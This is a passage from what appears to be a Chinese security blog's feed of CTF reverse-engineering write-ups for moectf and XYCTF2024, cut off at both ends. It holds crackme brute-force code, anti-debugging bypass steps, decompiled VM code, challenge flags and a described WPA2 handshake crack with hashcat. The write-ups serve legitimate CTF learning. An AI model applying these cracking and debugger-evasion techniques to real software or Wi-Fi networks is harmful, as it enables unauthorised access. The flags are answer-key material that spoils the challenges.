c++)</span><br><span class="line">                &#123;</span><br><span class="line">                        <span class="keyword">for</span> (<span class="type">char</span> d = <span class="string">&#x27;a&#x27;</span>; d &lt;= <span class="string">&#x27;z&#x27;</span>; d++)</span><br><span class="line">                        &#123;</span><br><span class="line">                                <span class="keyword">for</span> (<span class="type">char</span> e = <span class="string">&#x27;a&#x27;</span>; e &lt;= <span class="string">&#x27;z&#x27;</span>; e++)</span><br><span class="line">                                &#123;</span><br><span class="line">                                        <span class="keyword">for</span> (<span class="type">char</span> g = <span class="string">&#x27;0&#x27;</span>; g &lt;= <span class="string">&#x27;9&#x27;</span>; g++)</span><br><span class="line">                                        &#123;</span><br><span class="line">                                                cracking[<span class="number">8</span>] = b;</span><br><span class="line">                                                cracking[<span class="number">9</span>] = c;</span><br><span class="line">                                                cracking[<span class="number">10</span>] = d;</span><br><span class="line">                                                cracking[<span class="number">11</span>] = e;</span><br><span class="line">                                                cracking[<span class="number">13</span>] = g;</span><br><span class="line">                                                <span class="keyword">if</span> (check(cracking, <span class="number">15</span>))</span><br><span class="line">                                                &#123;</span><br><span class="line">                                                        <span class="built_in">printf</span>(<span class="string">&quot;found answer: %s\n&quot;</span>, cracking);</span><br><span class="line">                                                        <span class="keyword">return</span>;</span><br><span class="line">                                                &#125;</span><br><span class="line">                                        &#125;</span><br><span class="line">                                &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        CloseHandle(h);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">        bruteForce();</span><br><span class="line">        system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>moectf&#123;cr4ckm3&#125;</code></p><h1 id="moeprotector"><a href="#moeprotector" class="headerlink" title="moeprotector"></a>moeprotector</h1><p>考点SEH, 反调试<br>解法：挂上x64dbg+ScyllaHide(不要开TitanHide，有检测)，然后通过软件断点来不断追踪flag变化。<br>容易得到下面的伪代码</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">flag[0]^=0x31;</span><br><span class="line">flag[0]+=0x31;</span><br><span class="line">flag[0]-=0x31;</span><br><span class="line">flag[0]^=0x31;</span><br><span class="line">for(inti=0;i&lt;57;i++)</span><br><span class="line">&#123;</span><br><span class="line">        flag[i]^=21+i;</span><br><span class="line">        flag[i]+=20;</span><br><span class="line">&#125;</span><br><span class="line">for(inti=0;i&lt;57;i++)</span><br><span class="line">&#123;</span><br><span class="line">        flag[i]^=26+i;</span><br><span class="line">        flag[i]+=20;</span><br><span class="line">&#125;</span><br><span class="line">for(inti=0;i&lt;57;i++)</span><br><span class="line">&#123;</span><br><span class="line">        flag[i]^=25+i;</span><br><span class="line">        flag[i]+=20;</span><br><span class="line">&#125;</span><br><span class="line">for(inti=0;i&lt;57;i++)</span><br><span class="line">&#123;</span><br><span class="line">        if(hexData[i]!=flag[i])</span><br><span class="line">                die();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>找到hexData的值，写解密脚本就行了。<br><code>moectf&#123;w1Nd0Ws_S3H_15_A_g0oD_m37h0d_70_h4nd13_EXCEPTI0NS&#125;</code></p><h1 id="特工luo-闻风而动"><a href="#特工luo-闻风而动" class="headerlink" title="特工luo: 闻风而动"></a>特工luo: 闻风而动</h1><p>1.考察易语言程序的逆向分析，Keygen就不说了，一个简单的异或转换工具，cli在连接后会收到服务器发来的DES加密后flag，加密密码是WIFI密码走keygen，而客户端保存的时候再会走一次RC4加密，密码是 flag.fromserver 对没错 密码就是文件名<br>2.考察无线安全中对于无线握手包的密码破解。选手需要将cap文件转换为可以供hashcat读取的哈希，并使用hashcat结合题目提示来进行暴力破解（cap文件分析发现是WAP2类型，所以哈希类型是22000）跑出来就可以写解密脚本了（用易语言写最好）<br>3.值得注意的是，在爆破的时候，需要对密码keygen进行分析，可以从异或数字的大小来观察是数字还是字符，然后反异或过来，就可以缩减密码文本，从而降低爆破时间。<br>解密</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">输出调试文本(到文本(解密数据(解密数据(读取文件(&quot;flag.fromserver&quot;), &quot;flag.fromserver&quot;, #RC4加密), &quot;4g3n71u0&quot;, #DES加密)))</span><br></pre></td></tr></table></figure><p><code>moectf&#123;h4cker_Lu0Q1@n_is_trying_to_0p3n_your_r3g15t3r3d_res1denc3&#125;</code></p><h1 id="特工luo-深入敌营"><a href="#特工luo-深入敌营" class="headerlink" title="特工luo: 深入敌营"></a>特工luo: 深入敌营</h1><p>简单VM题目，拿去年 NCTF ezVM 的题改的简单版本，去掉了trash code，用z3-solver即可化简、求解。属于本比赛最难的逆向工程题目。<br>首先UPX -d 脱一下壳，放入ida分析一下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int8 saver; <span class="comment">// r15</span></span><br><span class="line">  __int64 _code; <span class="comment">// rdi</span></span><br><span class="line">  __int64 _rsp; <span class="comment">// rax</span></span><br><span class="line">  __int64 _rip; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v7; <span class="comment">// cl</span></span><br><span class="line">  __int16 v8; <span class="comment">// cx</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// ecx</span></span><br><span class="line">  __int64 v10; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// ebp</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v12; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v13; <span class="comment">// r14</span></span><br><span class="line">  <span class="type">rsize_t</span> v14; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v15; <span class="comment">// rax</span></span><br><span class="line">  __int64 v16; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v17; <span class="comment">// rcx</span></span><br><span class="line"></span><br><span class="line">  saver = <span class="number">0</span>;</span><br><span class="line">  LODWORD(_code) = <span class="number">0</span>;</span><br><span class="line">LABEL_2:</span><br><span class="line">  _rsp = (<span class="type">unsigned</span> <span class="type">int</span>)save;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    _rip = (<span class="type">unsigned</span> <span class="type">int</span>)_code;</span><br><span class="line">    _code = (<span class="type">unsigned</span> <span class="type">int</span>)(_code + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">switch</span> ( insn[_rip] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0xB</span>u:                                <span class="comment">// v_add_rsp_8</span></span><br><span class="line">        _rsp = (<span class="type">unsigned</span> <span class="type">int</span>)(_rsp + <span class="number">8</span>);</span><br><span class="line">        save = _rsp;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0xC</span>u:</span><br><span class="line">        _rsp = (<span class="type">unsigned</span> <span class="type">int</span>)(_rsp - <span class="number">2</span>);        <span class="comment">// v_push_word</span></span><br><span class="line">        save = _rsp;</span><br><span class="line">        <span class="built_in">stack</span>[_rsp + <span class="number">1</span>] = <span class="built_in">stack</span>[(<span class="type">unsigned</span> <span class="type">int</span>)(_rsp + <span class="number">2</span>) + <span class="number">1</span>];</span><br><span class="line">        <span class="built_in">stack</span>[(<span class="type">unsigned</span> <span class="type">int</span>)(_rsp + <span class="number">1</span>) + <span class="number">1</span>] = <span class="built_in">stack</span>[(<span class="type">unsigned</span> <span class="type">int</span>)(_rsp + <span class="number">3</span>) + <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0xE</span>u:                                <span class="comment">// v_notSelf</span></span><br><span class="line">        <span class="built_in">stack</span>[(<span class="type">unsigned</span> <span class="type">int</span>)(_rsp + <span class="number">1</span>) + <span class="number">1</span>] = ~<span class="built_in">stack</span>[(<span class="type">unsigned</span> <span class="type">int</span>)(_rsp + <span class="number">1</span>) + <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x14</span>u:                               <span class="comment">// v_and</span></span><br><span class="line">        v16 = (<span class="type">unsigned</span> <span class="type">int</span>)(_rsp + <span class="number">1</span>);</span><br><span class="line">        <span class="built_in">stack</span>[v16 + <span class="number">1</span>] &amp;= <span class="built_in">stack</span>[_rsp + <span class="number">1</span>];</span><br><span class="line">        _rsp = (<span class="type">unsigned</span> <span class="type">int</span>)v16;</span><br><span class="line">        save = v16;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x19</span>u:                               <span class="comment">// v_exit</span></span><br><span class="line">        <span class="keyword">return</span> *(_DWORD *)&amp;insn[_code];</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x32</span>u:</span><br><span class="line">        v7 = insn[_code];                       <span class="comment">// v_push_byte</span></span><br><span class="line">        _rsp = (<span class="type">unsigned</span> <span class="type">int</span>)(_rsp - <span class="number">1</span>);</span><br><span class="line">        save = _rsp;</span><br><span class="line">        LODWORD(_code) = _code + <span class="number">1</span>;</span><br><span class="line">        <span class="built_in">stack</span>[_rsp + <span class="number">1</span>] = v7;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x49</span>u:                               <span class="comment">// v_dup</span></span><br><span class="line">        _rsp = (<span class="type">unsigned</span> <span class="type">int</span>)(_rsp - <span class="number">1</span>);</span><br><span class="line">        save = _rsp;</span><br><span class="line">        <span class="built_in">stack</span>[(<span class="type">unsigned</span> <span class="type">int</span>)_rsp + <span class="number">1</span>] = <span class="built_in">stack</span>[(<span class="type">unsigned</span> <span class="type">int</span>)(_rsp + <span class="number">1</span>) + <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x72</span>u:                               <span class="comment">// v_not</span></span><br><span class="line">        <span class="built_in">stack</span>[_rsp + <span class="number">1</span>] = ~<span class="built_in">stack</span>[_rsp + <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x7B</span>u:                               <span class="comment">// v_read_chr</span></span><br><span class="line">        v14 = (<span class="type">char</span>)<span class="built_in">stack</span>[_rsp + <span class="number">1</span>];</span><br><span class="line">        v15 = (<span class="type">unsigned</span> <span class="type">int</span>)(_rsp - <span class="number">7</span>);</span><br><span class="line">        save = v15;</span><br><span class="line">        *(_QWORD *)&amp;<span class="built_in">stack</span>[v15 + <span class="number">1</span>] = Buffer;</span><br><span class="line">        gets_s(Buffer, v14);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_2;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x7C</span>u:</span><br><span class="line">        saver = <span class="built_in">stack</span>[_rsp + <span class="number">1</span>];                <span class="comment">// v_save</span></span><br><span class="line">        <span class="keyword">goto</span> LABEL_9;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x8D</span>u:</span><br><span class="line">        <span class="keyword">if</span> ( !<span class="built_in">stack</span>[_rsp + <span class="number">1</span>] )</span><br><span class="line">          LODWORD(_code) = *(_DWORD *)&amp;<span class="built_in">stack</span>[_rsp + <span class="number">2</span>];</span><br><span class="line">        _rsp = (<span class="type">unsigned</span> <span class="type">int</span>)(_rsp + <span class="number">5</span>);</span><br><span class="line">        save = _rsp;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x8E</span>u:                               <span class="comment">// v_print</span></span><br><span class="line">        v11 = insn[_code];</span><br><span class="line">        v12 = <span class="number">0LL</span>;</span><br><span class="line">        _code = (<span class="type">unsigned</span> <span class="type">int</span>)(_code + <span class="number">1</span>);</span><br><span class="line">        v13 = insn[_code] ^ v11;</span><br><span class="line">        LODWORD(_code) = _code + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v13 )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">do</span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">putchar</span>(v11 ^ <span class="built_in">stack</span>[v13 + (<span class="type">unsigned</span> <span class="type">int</span>)_rsp - v12]);</span><br><span class="line">            LODWORD(_rsp) = save;</span><br><span class="line">            ++v12;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">while</span> ( v12 &lt; v13 );</span><br><span class="line">        &#125;</span><br><span class="line">        save = v13 + (_DWORD)_rsp;</span><br><span class="line">        <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_2;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x91</span>u:                               <span class="comment">// v_push_dword</span></span><br><span class="line">        v9 = *(_DWORD *)&amp;insn[_code];</span><br><span class="line">        _rsp = (<span class="type">unsigned</span> <span class="type">int</span>)(_rsp - <span class="number">4</span>);</span><br><span class="line">        save = _rsp;</span><br><span class="line">        LODWORD(_code) = _code + <span class="number">4</span>;</span><br><span class="line">        *(_DWORD *)&amp;<span class="built_in">stack</span>[_rsp + <span class="number">1</span>] = v9;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x99</span>u:</span><br><span class="line">        _rsp = (<span class="type">unsigned</span> <span class="type">int</span>)(_rsp + <span class="number">4</span>);        <span class="comment">// v_add_rsp_4</span></span><br><span class="line">        save = _rsp;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0xAD</span>u:</span><br><span class="line">        _rsp = (<span class="type">unsigned</span> <span class="type">int</span>)(_rsp - <span class="number">1</span>);        <span class="comment">// v_push_saver</span></span><br><span class="line">        save = _rsp;</span><br><span class="line">        <span class="built_in">stack</span>[(<span class="type">unsigned</span> <span class="type">int</span>)_rsp + <span class="number">1</span>] = saver;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0xB5</span>u:</span><br><span class="line">        _rsp = (<span class="type">unsigned</span> <span class="type">int</span>)(_rsp + <span class="number">2</span>);        <span class="comment">// v_add_rsp_2</span></span><br><span class="line">        save = _rsp;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0xB7</span>u:</span><br><span class="line">        v8 = *(_WORD *)&amp;insn[_code];            <span class="comment">// v_push_word</span></span><br><span class="line">        _rsp = (<span class="type">unsigned</span> <span class="type">int</span>)(_rsp - <span class="number">2</span>);</span><br><span class="line">        save = _rsp;</span><br><span class="line">        LODWORD(_code) = _code + <span class="number">2</span>;</span><br><span class="line">        *(_WORD *)&amp;<span class="built_in">stack</span>[_rsp + <span class="number">1</span>] = v8;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0xB8</span>u:</span><br><span class="line">        <span class="built_in">stack</span>[_rsp + <span class="number">1</span>] = *(_BYTE *)(<span class="built_in">stack</span>[_rsp + <span class="number">1</span>] + *(_QWORD *)&amp;<span class="built_in">stack</span>[_rsp + <span class="number">2</span>]);<span class="comment">// v_add</span></span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0xD3</span>u:</span><br><span class="line">LABEL_9:</span><br><span class="line">        _rsp = (<span class="type">unsigned</span> <span class="type">int</span>)(_rsp + <span class="number">1</span>);        <span class="comment">// v_add_rsp_1</span></span><br><span class="line">        save = _rsp;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0xEA</span>u:</span><br><span class="line">        v10 = *(_QWORD *)&amp;insn[_code];          <span class="comment">// v_push_qword</span></span><br><span class="line">        _rsp = (<span class="type">unsigned</span> <span class="type">int</span>)(_rsp - <span class="number">8</span>);</span><br><span class="line">        save = _rsp;</span><br><span class="line">        LODWORD(_code) = _code + <span class="number">8</span>;</span><br><span class="line">        *(_QWORD *)&amp;<span class="built_in">stack</span>[_rsp + <span class="number">1</span>] = v10;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0xFB</span>u:</span><br><span class="line">        <span class="keyword">if</span> ( <span class="built_in">stack</span>[_rsp + <span class="number">1</span>] )                  <span class="comment">// v_not_not</span></span><br><span class="line">          <span class="built_in">stack</span>[_rsp + <span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0xFF</span>u:</span><br><span class="line">        v17 = <span class="built_in">stack</span>[_rsp + <span class="number">1</span>];                  <span class="comment">// v_not</span></span><br><span class="line">        <span class="keyword">if</span> ( (_BYTE)v17 )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( (_BYTE)v17 == <span class="number">1</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)_rsp &gt;= <span class="number">0x100</span>uLL )</span><br><span class="line">              _report_rangecheckfailure(v17, (<span class="type">unsigned</span> <span class="type">int</span>)_rsp, envp);</span><br><span class="line">            <span class="built_in">stack</span>[_rsp + <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">stack</span>[_rsp + <span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到是一个标准化的VM，我们可以写出z3-solver解题脚本。<br><code>moectf&#123;vv1ii?AGENT+1U0_-*7_$[TH/./e]+$_FinAL_v!c70Ry?&#125;</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;关于WP&quot;&gt;&lt;a href=&quot;#关于WP&quot; class=&quot;headerlink&quot; title=&quot;关于WP&quot;&gt;&lt;/a&gt;关于WP&lt;/h1&gt;&lt;p&gt;Author: 0xcafebabe&lt;br&gt;第三方题目（非XDSEC成员）:&lt;br&gt;1.xor(大嘘) (Author: 中</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>XYCTF2024复现|Reverse</title>
    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2024/10/20/XYCTF2024%E5%A4%8D%E7%8E%B0Reverse/"/>
    <id>https://github.com/xyy9233/xyy9233.github.io.git/2024/10/20/XYCTF2024%E5%A4%8D%E7%8E%B0Reverse/</id>
    <published>2024-10-19T16:00:00.000Z</published>
    <updated>2024-10-30T11:41:26.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="XYCTF2024复现-Reverse"><a href="#XYCTF2024复现-Reverse" class="headerlink" title="XYCTF2024复现|Reverse"></a>XYCTF2024复现|Reverse</h1><p><a href="https://blog.xinshi.fun/wp/xyctf-2024-reverse/">https://blog.xinshi.fun/wp/xyctf-2024-reverse/</a></p><h2 id="DebugMe-lt-Android-gt-lt-调试-gt"><a href="#DebugMe-lt-Android-gt-lt-调试-gt" class="headerlink" title="DebugMe&lt;\Android&gt; &lt;调试&gt;"></a>DebugMe&lt;\Android&gt; &lt;调试&gt;</h2><blockquote><h4 id="如何使用JD-GUI反编译、修改JAR包里的-class文件并重新生成新的JAR"><a href="#如何使用JD-GUI反编译、修改JAR包里的-class文件并重新生成新的JAR" class="headerlink" title="如何使用JD-GUI反编译、修改JAR包里的.class文件并重新生成新的JAR"></a>如何使用JD-GUI反编译、修改JAR包里的.class文件并重新生成新的JAR</h4><p>在开始之前，请确保你已经安装了JD-GUI反编译工具。如果没有，你可以从其官方网站下载并安装。<br><strong>步骤1：打开JD-GUI并导入JAR文件</strong><br>打开JD-GUI，点击菜单栏上的“文件”&gt;“打开”，然后选择你要反编译的JAR文件。<br><strong>步骤2：反编译.class文件</strong><br>在JD-GUI中，你可以看到JAR文件中的所有类。选择你要修改的类，然后点击右键，选择“反编译”选项。这将为你提供.java源代码。<br><strong>步骤3：修改.java源代码</strong><br>在.java源代码中，找到你想要修改的部分并进行修改。你可以修改任何你想要的内容，比如变量名、方法名或者添加新的方法或属性。<br><strong>步骤4：重新编译.java文件</strong><br>在JD-GUI中，选择你要修改的.java文件，然后点击右键，选择“编译”选项。这将为你生成新的.class文件。<br><strong>步骤5：创建新的JAR文件</strong><br>首先，你需要将修改后的.class文件复制到新的文件夹中。然后，使用命令行工具（如Windows的cmd或Linux的终端）进入到这个文件夹。接下来，使用jar命令来创建新的JAR文件。在命令行中输入以下命令：<br>jar cvf newjarname.jar *.class<br>其中，newjarname是你想要的新JAR文件的名称。这个命令将创建一个新的JAR文件，其中包含你修改后的所有.class文件。<br><strong>步骤6：测试新的JAR文件</strong><br>为了确保你的修改没有引入任何错误，你需要测试新的JAR文件。你可以使用Java命令来运行它：<br>java -jar newjarname.jar<br>如果一切顺利，你的程序应该能够正常运行，并且显示出你所做的更改。<br>需要注意的是，反编译和修改别人的代码可能涉及到法律问题，所以在进行这个操作之前，请确保你有合法的权利去修改这个代码。此外，反编译和修改代码可能会导致程序出错或者不稳定，所以在进行这些操作时一定要小心谨慎。如果你不熟悉Java编程和反编译过程，建议你寻求专业人士的帮助。</p></blockquote><p><a href="https://blog.csdn.net/Python_0011/article/details/132040387?fromshare=blogdetail&sharetype=blogdetail&sharerId=132040387&sharerefer=PC&sharesource=m0_73495245&sharefrom=from_link">ADB命令</a></p><p>yixinBC ✌️ 的视频非常好 BV182421T7BS 从 27:22 开始</p><p>解包，添加可调试配置，打包签名，安装， adb 启动调试， JEB 附加</p><h2 id="Trustme-lt-apk-gt-lt-gt"><a href="#Trustme-lt-apk-gt-lt-gt" class="headerlink" title="Trustme&lt;\apk&gt;&lt;?&gt;"></a>Trustme&lt;\apk&gt;&lt;?&gt;</h2><p><a href="https://blog.csdn.net/L_fly_J/article/details/110948248?fromshare=blogdetail&sharetype=blogdetail&sharerId=110948248&sharerefer=PC&sharesource=m0_73495245&sharefrom=from_link">adb连接MuMu、逍遥、夜神、雷电模拟器以及腾讯手游助手以及断开连接</a></p><p>正好也是道mobile题</p><p>四个师傅有四种做法：</p><h3 id="法一：运行观察"><a href="#法一：运行观察" class="headerlink" title="法一：运行观察"></a>法一：运行观察</h3><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/image-20241025023557938.png" alt="image-20241025023557938"></p><h3 id="法二：解包观察："><a href="#法二：解包观察：" class="headerlink" title="法二：解包观察："></a>法二：解包观察：</h3><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/image-20241025023808285.png" alt="image-20241025023808285"></p><p>法三：硬解</p><h2 id="Findme-lt-随机数-gt-lt-动调-gt-lt-gt"><a href="#Findme-lt-随机数-gt-lt-动调-gt-lt-gt" class="headerlink" title="Findme&lt; 随机数 &gt; &lt;动调&gt;&lt;&gt;"></a>Findme&lt; 随机数 &gt; &lt;动调&gt;&lt;&gt;</h2><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/image-20241024203645781.png" alt="image-20241024203645781"></p><p>依次扔到die中，发现4是可执行文件（连接程序）</p><h2 id="我的白月光-lt-动调-gt"><a href="#我的白月光-lt-动调-gt" class="headerlink" title="*我的白月光&lt;动调&gt;"></a>*我的白月光&lt;动调&gt;</h2><h2 id="记忆的时光机"><a href="#记忆的时光机" class="headerlink" title="记忆的时光机"></a>记忆的时光机</h2><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/image-20241025015037026.png" alt="image-20241025015037026"></p><h2 id="馒-lt-算法-gt"><a href="#馒-lt-算法-gt" class="headerlink" title="馒 &lt;算法&gt;"></a>馒 &lt;算法&gt;</h2><p>哈夫曼树通常以二叉树的形式出现，所以也称最优二叉树，是一类带权路径长度最短的树</p><h2 id="聪明的信使-lt-凯撒-gt"><a href="#聪明的信使-lt-凯撒-gt" class="headerlink" title="聪明的信使&lt;凯撒&gt;"></a>聪明的信使&lt;凯撒&gt;</h2><p>凯撒的代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> 